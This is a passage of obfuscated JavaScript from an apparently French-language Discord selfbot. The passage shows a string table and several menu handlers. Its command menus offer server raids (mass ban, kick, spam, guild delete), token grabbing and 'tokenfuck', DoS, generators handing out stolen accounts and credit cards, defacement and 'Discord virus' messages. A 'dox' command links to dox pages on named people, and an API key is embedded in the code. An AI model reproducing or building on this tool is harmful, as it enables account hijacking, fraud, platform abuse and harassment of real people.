                        }, ch.stcUb = 'Id Not found.', ch.mmyHC = 'Muump', ch.bMvCa = 'permission insuffisante', ch.GWpXq = 'Commande name all effectué', ch.zxTxk = ':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.(**', ch.MOUJu = 'diff', ch.cezRG = 'Pornhub', ch.JsldW = function (gJ) {
                          return gJ();
                        }, ch.IfrVz = 'fFKts', ch.rbUXY = 'axdhD', ch.vBatz = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.UzPAO = 'o.o', ch.UbVKD = '** Hidden Wiki Drugs **', ch.gtnmW = 'https://p0.storage.canalblog.com/03/53/1450433/110403700.gif', ch.ogbxE = 'iSDly', ch.gCHRD = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.UnQKt = 'WAgth', ch.piItO = 'JYNpq', ch.Dywob = '8|3|2|6|4|9|5|7|0|1', ch.uKZvU = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.Xhnon = 'assasination', ch.GjDvq = 'Neko 👀❤️', ch.bRMZW = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.UgtvS = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.ONEyo = function (gJ, gK) {
                          return gJ <= gK;
                        }, ch.fMclF = 'Hostname', ch.jdDJg = 'Pays code', ch.Xloet = 'Pays code 3', ch.cEtjF = 'Nom du Pays', ch.DwrnE = 'Code', ch.ajnCs = 'Nom de la Région', ch.IrArT = 'Code postale', ch.cNHbm = 'Longitude', ch.JmcZu = 'Code du merto', ch.roJDl = 'Organisation', ch.mkgge = 'Asn', ch.hGWRm = 'Format', ch.MfmZC = 'Temps', ch.DiPZt = 'Continent', ch.fJTSu = 'EMail jetable verif', ch.YYfWE = 'https://us.123rf.com/450wm/alekseyvanin/alekseyvanin1808/alekseyvanin180801585/106689124-envelope-mail-vector-icon-filled-flat-sign-for-mobile-concept-and-web-design-message-simple-solid-ic.jpg?ver=6', ch.RpRpC = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.DpKoL = 'disposable', ch.yPccP = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.jPRXF = 'iLxaX', ch.XuRmn = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.KsmQP = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.stfhq = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.OsiKx = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.PkBXA = ' ago', ch.NlDHY = 'https://some-random-api.ml/img/fox', ch.sRyPO = 'désactivé', ch.qmfGG = '*Infecté :*', ch.cmApZ = '3|4|8|0|6|2|1|9|7|5', ch.NZFLt = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%', ch.QVOWF = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.CInGA = '>>> ***Voila ton compte Spotify :***', ch.mvxAw = '(Commande : {/gspotify} Effectuer) \n ================', ch.Egfob = '>>> Restock de comptes dofus en cours..', ch.dZDXw = 'USD: 1', ch.GFkAp = '\nEUR: ', ch.GcBWE = 'https://cdn.discordapp.com/attachments/731197380732518460/738696936592375918/symbole-d-euro-et-de-dollar-paires-d-eur-usd-39052942.jpg', ch.apuBj = 'https://api.c99.nl/currency?key=NYK0X-0S6BJ-8EA8G-U5LRV&amount=1&from=USD&to=EUR&json', ch.GCPXo = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%', ch.CraGf = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%', ch.NgSIR = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.BwEsP = '>>> Restock de pulsar en cours..', ch.oqGUw = 'https://cdn.discordapp.com/attachments/681115950912897084/683624551283687479/IMG_20200301_113738.png', ch.Vzvke = 'c\'est quoi ça là bas... \nO PTN DES MIGRANTS', ch.nuAHS = 'développé par punchnox', ch.zHYKT = 'MTI4NzM0OjFpMmhuZToxMjMxMjM=', ch.hxHAP = 'ae488379-351d-4a4f-ad32-2b9b01c91657', ch.cPaow = 'MTIzNDV8MTIzNDV8MTMyNDU0', ch.hMFbQ = function (gJ) {
                          return gJ();
                        }, ch.LBhgO = 'psSvA', ch.tPpze = '4|3|0|2|1', ch.VPnfs = 'https://cdn.discordapp.com/attachments/602163438390738957/603946294888759316/tumblr_mns4ojjGJb1rzkceno1_500.gif', ch.VNmaP = 'Deface réussi :white_check_mark:', ch.azNfE = '𝙇𝙚 𝙢𝙚𝙢𝙗𝙧𝙚 ', ch.zbwFz = 'text', ch.bqkBj = '**Ebay View Bots**', ch.XzTQD = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.eNLbs = '**「INFOS PREMIUM」**', ch.Ydehg = '**Status**\n', ch.UDHNg = '*MultiStream \n Ytb \n rpc \n Twitter \n Spotiy \n sretro1 \n anime1* \n', ch.srESF = '**Hack**\n', ch.cghqa = '*adress \n dos \n rtoken \n ebayview \n tokeninfo \n tokenfuck\nipskype\nmailskype\n*', ch.YYvYV = '*\n sms \n screen \n grabbheader \n geninfo \n torcheck \n proxies \n repucheck \n webbackup \n ytmp3*', ch.KoCQB = '**Fun**\n', ch.ettFJ = '**Raid**\n', ch.aKZpK = '*guilddelete \n spam \n stopspam \n banall \n allkick \n del*\n', ch.dVhdL = '**Tools**\n', ch.ElzAS = '*robpp \n myip \n newtoken \n checkhost \n sond \n qrcode \n changehypesquad \n dm \n firstmessage \n empty \n binaireencode \n binairedecode \n defautall \n mastercard\n Farmxp \n stopfarmxp*', ch.mGhFu = '**Gen**\n', ch.EfBRU = '*Gspotify \n nordvpn \n uplay \n pornhub \n gtoken \n dofus \n netflix \n pulsar\n cc*\n', ch.tzwcm = '*backup-f \n webbackup*\n', ch.GVSYj = 'HyjEJ', ch.wVzhh = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.XDDhV = '** 「MENU GEN」 **', ch.BcdXM = '***gen un metal dungeon***', ch.BqxBJ = ' ```𝗚𝘀𝗽𝗼𝘁𝗶𝗳𝘆``` ', ch.RaKZc = ' ```𝗨𝗽𝗹𝗮𝘆``` ', ch.MYWAr = '***gen une couleur random***', ch.ajNPP = ' ```𝗘𝗺𝗮𝗶𝗹``` ', ch.ILLlD = '4|7|3|2|0|5|6|1', ch.YGTIS = '#007dffc5', ch.MHcxI = '#b100ff87', ch.OQrbp = '#fff63d9c', ch.NLzHA = '#ff6c6c', ch.aoulp = '#FFFAAA', ch.iiBqb = '#FFD7AA', ch.VZFeK = '#FFB7AA', ch.GGkwQ = '#FFAAAA', ch.ftfEg = '#F0FFAA', ch.KYMXu = '#DCFFAA', ch.uzcAH = '#C1FFAA', ch.oZnBq = '#ABFFAA', ch.lxhob = '#AAFFDC', ch.ssTeg = '#AAFFF7', ch.hppGu = '#AAF2FF', ch.qanUP = '#AACFFF', ch.eqsVC = '#B6AAFF', ch.jFmSP = '#C9AAFF', ch.apIna = '#DCAAFF', ch.CsVgA = '#FFAADE', ch.YCJnI = '#FFAAC8', ch.WkOts = '#00ff348a', ch.FRRuZ = '#f097ff', ch.nVFYH = '╔══════════════════════════════════════════════════════════════════════════════╗', ch.GRYUG = 'Désactivé', ch.bmygs = 'VRKZD', ch.dtaiN = 'AFvRG', ch.vIavM = '[31m', ch.Fqtji = '[0m', ch.KaoOs = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.wsJLA = '2|4|1|3|0', ch.DyCff = 'https://punchnox-project-api.herokuapp.com/api/logs/report', ch.ucvvt = '**:x: il manque des arguments**', ch.gDEVz = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.VMsGJ = '**please enter a location!**', ch.Ictol = '⌛Timezone', ch.nTpMK = '🌡️Temperature', ch.MEgtp = '💨Winds', ch.ycevW = '💧Humidity', ch.rmQit = 'qGvdK', ch.IbBtW = 'hpdDV', ch.cJUdq = 'WATCHING', ch.IbOeE = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.UsSHO = 'AALxw', ch.HvsEp = function (gJ, gK) {
                          return gJ - gK;
                        }, ch.seWdf = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.gtEBa = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.RNwRy = ' day', ch.gwVTc = ' days', ch.ZGiUI = 'aCjps', ch.lswtp = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.YfVnr = 'posterize', ch.KNgDN = 'RANDOM', ch.OMNte = 'cKBNd', ch.UYIWC = '[Selfbot] la version du self est bien à jours.', ch.myisr = '[Selfbot] la version du self n\'est pas à jours.', ch.GIKtx = '** 「MENU UPDATE」 **', ch.GinJk = 'anal', ch.HxFAa = 'https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif', ch.GdxSZ = 'GAY', ch.ZXsHa = 'https://api.alexflipnote.dev/filter/gay?image=', ch.jobLe = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.rBjAD = 'mwQkr', ch.YtTFh = 'eqYCx', ch.weuCe = 'wAVNC', ch.PQgFb = 'Ip verif', ch.dHlkz = 'L\'ip est bien valid', ch.MhtOA = 'l\'ip n\'est pas valide', ch.vvrJY = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.bkVEp = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.AkZBl = 'UwKpf', ch.QpPfz = 'cwQoD', ch.RxEOS = 'vwUTm', ch.ZRctj = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.vXaVa = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.fYPhW = 'cLfnF', ch.XGrxC = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.YbDLq = 'Commande restart effectué', ch.IENXE = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.ecgXe = 'triggered.gif', ch.dKokP = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.AeruX = 'nombre de users :', ch.bfquj = 'nbusers effectué', ch.uQywM = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.RoeNJ = 'KHdkS', ch.iZOjS = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.GqWCj = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.vOJek = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.RZNDN = 'rbBEq', ch.LWWGX = './logo.png', ch.zikRT = 'russia', ch.UbmDe = ':warning: AVERTISSEMENT :warning:', ch.uDnII = '**AVERTI PAR :** ', ch.xpxIR = 'IQBzn', ch.bedoL = 'CwkyO', ch.RHTSI = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.BUmFb = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%', ch.DatWb = '>>> ***Voila ta cc :***', ch.kSYzm = '(Commande : {/cc} Effectuer) \n ================', ch.ueOYW = '`> (°□°）>`', ch.OQtKg = '7|5|0|2|1|3|9|6|4|8', ch.dKPzJ = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.qwIbR = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.LHnsk = 'sJZvT', ch.ONEyE = '**AFK enlevé avec succes**', ch.pjbgp = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.NaqsR = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.lqqOb = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.rojIz = 'SDYtd', ch.HSScM = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.slsgq = '** 「MENU SELFBOT」 **', ch.qqCSG = '***https://mega.nz/file/XeYhVYLB#uPLRMzRNYGU69Pegi0o8rmOIuvBFFz_JENs_N7c_yc8***', ch.AqbsI = '```𝗦𝗲𝗹𝗳𝗕𝗼𝘁𝗽𝘂𝗻𝗰𝗵 𝘃𝟭.𝟬```', ch.TcjlX = 'Lien raccourcis', ch.CRUJy = '**Token Info**', ch.LwOMr = 'token invalid', ch.ZESUD = 'https://media.discordapp.net/attachments/495996735097798686/569116910126628865/ezgif.com-gif-maker.gif', ch.qESRl = 'rip', ch.OuCAn = '/Data/statut.json', ch.wuAah = 'MOmgG', ch.luqTP = 'yyMXk', ch.NIcfi = 'INVERT', ch.qPOas = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.nsMsV = 'YlURQ', ch.ZQnob = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.UxdmL = 'qaiBW', ch.BKRbv = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.mmMGo = 'YuhVY', ch.RFFgy = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.rYzsR = ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 𝟏𝟎𝟎%', ch.wRkYJ = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.cOkUH = 'BlpTd', ch.EUTRg = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.JybkP = ']: 𝐕𝐢𝐫𝐮𝐬 𝐥𝐚𝐧𝐜𝐞́', ch.XkydQ = '***Il manque le nom du site*** :x:', ch.YbHKY = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.mSpyi = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.InDYX = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.LHwQW = 'https://nekobot.xyz/api/imagegen?type=phcomment&image=', ch.qQhjo = '&text=', ch.cVjvS = '&username=', ch.FLMuZ = 'https://i.pinimg.com/originals/de/1c/91/de1c91788be0d791135736995109272a.png', ch.efsJt = 'ヽ༼⊙_⊙༽ﾉ', ch.vdEAj = '▓▓▓▓▓▓▓▓░░ 80%', ch.FwUSw = '#FF0000', ch.fvVnd = '#FF8000', ch.hhKFp = '#FFB200', ch.yzSHG = '#FFE800', ch.ElRaD = '#AEFF00', ch.mruqw = '#55FF00', ch.MDvBh = '#00FF00', ch.aFQya = '#00FFD8', ch.dQsGS = '#00FBFF', ch.nFhXQ = '#00AEFF', ch.WgpWd = '#3E00FF', ch.dEZQr = '#C100FF', ch.TaqpW = '#FF00B2', ch.bONCL = '#FF005D', ch.cmUsq = '#f62bff', ch.EBjDf = '#ff0000', ch.KBoqG = '#0055ff', ch.PxQUh = '#00ff19', ch.RdWBD = '#a500ff', ch.KnFmT = 'MANAGE_CHANNELS', ch.TRwEQ = ' channels.```', ch.kaLYh = '❌**  il manque le lien du site à convertire en qrcode **', ch.qUveT = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.AappH = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.ElhxG = 'yKEpA', ch.hUOeA = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.rxuzQ = 'info', ch.jbklC = 'RUlwh', ch.HTgeT = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.NFAsv = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.KSjki = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.VJaSN = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.Yrilw = '``` 🎛️ CPU```', ch.svdMj = 'https://some-random-api.ml/base64?decode=', ch.Ujuwx = '0|6|3|7|4|5|8|1|2|9', ch.faeVY = 'mLIZE', ch.LGxaj = '`< (°□°）<`', ch.AHXfp = function (gJ, gK) {
                          return gJ > gK;
                        }, ch.XdUYj = 'T6D4', ch.GGCMt = '-VD82-', ch.AHQUN = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.pELri = '0AB', ch.jlUsO = 'discord.gg', ch.jklkg = 'Log:', ch.fHLdB = '--------------------------', ch.zwnHG = '***il manque un argument :x:***', ch.RUMeR = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.ObrBn = 'eLxBU', ch.dtcKN = 'Cgzcq', ch.DATZG = '📤OUTPUT', ch.OJdYF = function (gJ, gK) {
                          return gJ > gK;
                        }, ch.rGyVU = 'XMQia', ch.zctit = 'UqmxV', ch.SZBQs = 'oQrMS', ch.wtiwf = '📤OUPUT', ch.ruzSJ = '```bash\n# Command executed successfully but returned no output.```', ch.wQfoG = function (gJ, gK) {
                          return gJ < gK;
                        }, ch.OtbyD = function (gJ, gK) {
                          return gJ > gK;
                        }, ch.RaSGd = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', ch.SlvJi = '0123456789', ch.qXYSU = 'mwdaT', ch.JmBsj = 'eFjML', ch.RLcbF = function (gJ, gK) {
                          return gJ > gK;
                        }, ch.TUuFj = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.mUkHj = 'o_o', ch.WzZif = ':white_check_mark: Votre text est sur ce lien hastebins: ', ch.wIwYV = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░ 40%', ch.BzFcJ = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓░░░░░░░░░░░░░░░░░░░░░ 16%', ch.tyFmg = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░ 24%', ch.fjgbt = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░ 84%', ch.tNjca = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.ZlJLM = '>>> Restock  en cours \n **Chargement..** \n ▓▓░░░░░░░░░░░░░░░░░░░░░░░ 8%', ch.KLDYw = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░ 60%', ch.HjmLy = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░ 76%', ch.jNOTD = '>>> ***Voila ton jeu metals :*** ', ch.nEvoV = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░ 68%', ch.bFZuw = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░ 48%', ch.WFTTb = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.LEpMC = 'mIEfs', ch.KKhRX = '5|10|11|6|2|8|12|13|0|9|7|14|3|4|1', ch.iryRg = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.pFCDr = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.FWFFs = 'JudAf', ch.mXbpW = '8|0|10|6|7|2|3|9|1|5|4', ch.eNFnV = '>>> ***Voila ton compte nord vpn :***', ch.ovAIG = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.XvVhS = 'YouTube', ch.ljGlq = 'Youtube', ch.TVQAc = 'bwtlj', ch.dRvkC = '3|1|7|5|2|0|8|4|9|6', ch.ArksY = 'VDQst', ch.mtNWD = 'PWQrP', ch.TULHi = '>>> ***Voila ton compte psn :***', ch.ICkvx = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.QflqY = 'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR', ch.INOvp = 'grvPl', ch.BzGfi = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.WKPmB = '░░░░░░░░░░ 0%', ch.SpHYz = 'cJQLb', ch.KTftj = 'AMZxp', ch.hpwzt = '▓▓▓▓░░░░░░ 40%', ch.uWXJi = 'uTQDD', ch.KqiGE = '▓▓▓▓▓▓░░░░ 60%', ch.mNepI = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.XlwVP = '>>> Restock de comptes psn en cours..', ch.tGqQJ = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.uaCkw = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.iKjzp = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.FArbO = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.luUAQ = '<br>', ch.CDFrQ = 'MPVtL', ch.JFOyW = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.MaPdb = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.dHHkC = 'jaHJe', ch.cGkdk = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', ch.LKRAO = 'uALFz', ch.ufnbE = 'fZwNO', ch.SZycc = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.hPLgc = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.KgPzd = 'gVawF', ch.gGztL = function (gJ, gK) {
                          return gJ - gK;
                        }, ch.ziVQY = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.vKxlp = 'ADkmR', ch.fcafQ = '@everyone', ch.jUhfc = 'MJbFF', ch.NBIKx = '1|5|4|0|3|2', ch.aMPPF = '**Channels views**', ch.uLvrm = '>>> ```', ch.AtlJl = 'Liste des channels : ', ch.bvuEb = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.yWAXN = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.sfdYm = 'sneMX', ch.CopcA = 'anime2', ch.oTfTo = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.wfLqS = 'hoIFn', ch.Pnhqm = '10|2|3|14|1|5|8|7|0|13|4|9|11|6|12', ch.qsYsl = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.yDZSV = '>>> Restock de cc en cours..', ch.iLcSN = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.DPSuc = 'CWePL', ch.xpGqB = function (gJ, gK) {
                          return gJ === gK;
                        };
                        var ci = ch;
                        if (c9) {
                          var cj = '';
                        } else var cj = '|「Premium Requis」';
                        aN.emit('checkMessage', cg);
                        let ck = cg.content.split(' '),
                          cl = ck[0],
                          cm = ck.slice(1);
                        var cn = cg.content.substring(ab.length).split(' ');
                        let co = aN.commands.get(cl.slice(ab.length));
                        if (co) co.run(aN, cg, cm, cn);
                        var cp = cg.mentions.users.first();
                        if (cg.content.includes(ab + 'about')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU ABOUT」 **').addField('** 「Créateur」 **', '```𝙥𝙪𝙣𝙘𝙝𝙣𝙤𝙭```').addField('** 「Version」 **', '```' + aY + '```').addField('** 「Serveur」 **', '```' + ba + '```').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'team') {
                          if (bo) {
                            const gO = new aw.RichEmbed().setTitle('Menu Team').setDescription('*Merci d\'être en alliance avec le punchnox project\nDescription de la team : \n' + bq + '*').addField('Fondateur : ', '```' + br + '```').addField('Id du fondateur : ', '```' + bn + '```').addField('Nom de la team : ', '```' + bp + '```').addField('Serveur : ', '```' + bl + '```').setColor(ad).setImage(bm).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(gO);
                          } else {
                            const gQ = new aw.RichEmbed().setTitle('Menu Team').setDescription('**Vous n\'êtes pas dans une team en alliance avec le punchnox project**\n*Si vous voulez faire alliance avec le punchnox project allez sur : ' + ba + '*').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(gQ);
                          }
                        }
                        if (cg.content.includes(ab + 'help')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU HELP」 **').setDescription('').addField(' ```𝗔𝗯𝗼𝘂𝘁``` ', '***Affiche les infos du Self***').addField(' ```𝘀𝘁𝗮𝘁𝘂𝘀``` ', '***Affiche les infos status***').addField(' ```𝗛𝗮𝗰𝗸``` ', '***Affiche les infos h4x0r***').addField(' ```𝗙𝘂𝗻``` ', '***Affiche les infos Fun***').addField(' ```𝗥𝗮𝗶𝗱``` ', '***Affiche les infos Raid***').addField(' ```𝗧𝗼𝗼𝗹𝘀``` ', '***Affiche les infos Tools***').addField(' ```𝙈𝙤𝙙``` ', '***Affiche les infos Modération***').addField(' ```𝙉𝙨𝙛𝙬``` ', '***Affiche les infos nsfw +18***').addField(' ```𝗚𝗲𝗻``` ', '***Affiche le generateur*** ' + cj).addField(' ```𝗧𝗲𝘅𝘁𝗲``` ', '***Affiche les infos texte***').addField(' ```𝗗𝗶𝘃𝗲𝗿𝘀``` ', '***Affiche le menu Divers***').addField(' ```𝘀𝘆𝘀𝘁𝗲𝗺𝗲``` ', '***Affiche les infos du systeme***').addField(' ```𝗛𝗯𝗮𝗰𝗸𝘂𝗽``` ', '***Affiche le menu backup***').addField(' ```𝗨𝗽𝗱𝗮𝘁𝗲``` ', '***Affiche le menu update***').addField(' ```𝗣𝗿𝗲𝗺𝗶𝘂𝗺``` ', '***Affiche les infos premium***').addField(' ```𝗧𝗲𝗮𝗺``` ', '***Affiche les infos Team***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'divers')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU DIVERS」 **').setDescription('').addField(' ```𝗹𝗲𝗻𝗻𝘆``` ', '***( ͡° ͜ʖ ͡°)***').addField(' ```𝗗𝗮𝗻𝗰𝗲``` ', '***> (°□°）>͡***').addField(' ```𝗼_𝗼``` ', '***0_o***').addField(' ```𝗶𝗱𝗰``` ', '***╭∩╮（︶︿︶）╭∩╮***').addField(' ```𝗱𝗼𝘂𝗯𝗹𝗲𝗳𝗹𝗶𝗽``` ', '***┻━┻︵ (°□°)/ ︵ ┻━┻***').addField(' ```𝘁𝗮𝗯𝗹𝗲𝗳𝗹𝗶𝗽``` ', '***(╯°□°）╯︵ ┻━┻***').addField(' ```𝘂𝗻𝗳𝗹𝗶𝗽``` ', '***┬──┬ ノ( ゜-゜ノ)***').addField(' ```𝗴𝗶𝗺𝗺𝗲``` ', '***༼ つ ◕_◕ ༽つ***').addField(' ```𝘀𝗲𝗿𝗶𝗼𝘂𝘀``` ', '***(ಠ_ಠ)***').addField(' ```𝗺𝗼𝗻𝗲𝘆``` ', '***[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]***').addField(' ```𝗲𝘂𝘂𝘂``` ', '***(′ʘ⌄ʘ‵)***').addField(' ```𝘆𝗼𝗽``` ', '***\'=͟͟͞͞( ✌°∀° )☛***').addField(' ```𝗺𝗲𝗿𝗰𝗶``` ', '***(＾▽＾)***').addField(' ```...``` ', '***...***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'dox') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU DOX」 **').setDescription('').addField(' ```𝗡𝗲𝗹𝗲𝘁𝗵``` ', '||https://doxbin.org/upload/doxneleth||').addField(' ```𝗠𝗲𝗻𝗸𝗼𝗵``` ', ' ||https://pastebin.com/cxH6tVA2||').addField('```𝗡𝘄𝗥·𝗔𝗱𝗮𝗺```', '||https://pastebin.com/SZPnShV3||').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'texte')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU TEXTE」 **').setDescription('').addField('```𝗔𝘀𝗰𝗶𝗶 + (msg)```', '***Transforme votre texte en ascii***').addField('```𝗥𝗲𝘃𝗲𝗿𝘀𝗲 + (msg)```', '***reverse votre message*** ' + cj).addField('```𝗖𝘆𝗮𝗻𝗲 + (msg)```', '***Transforme votre texte en bleue***').addField('```𝗥𝗲𝗱 + (msg)```', '***Transforme votre texte en rouge***').addField('```𝗚𝗿𝗲𝗲𝗻 + (msg)```', '***Transforme votre texte en vert***').addField('```𝗬𝗲𝗹𝗹𝗼𝘄 + (msg)```', '***Transforme votre texte en jaune***').addField('```𝗼𝗿𝗮𝗻𝗴𝗲 + (msg)```', '***Transforme votre texte en orange***').addField('```𝘀𝗼𝘂𝗹𝗶 + (msg)```', '***Souligne votre texte***').addField('```𝗴𝗿𝗮s + (msg)```', '***Met votre texte en gras***').addField('```𝗯𝗮𝗿𝗿e + (msg)```', '***Barre votre texte***').addField('```𝗜𝘁𝗮 + (msg)```', '***Met votre texte en italique***').addField('```𝘀𝘂𝗿𝗹𝗶 + (msg)```', '***Surligne votre texte***').addField('```𝗿𝗲𝘁𝗼𝘂𝗿𝗻𝗲 + (msg)```', '***Retourne le texte***').addField('```𝗺𝗼𝗿𝘀𝗲 + (msg)```', '***Ecris le message en morse***').addField('```𝗴𝗿𝗮𝗻𝗱 + (msg)```', '***Ecris le message comme ça : :regional_indicator_w: :regional_indicator_s: :regional_indicator_h:***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'status')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
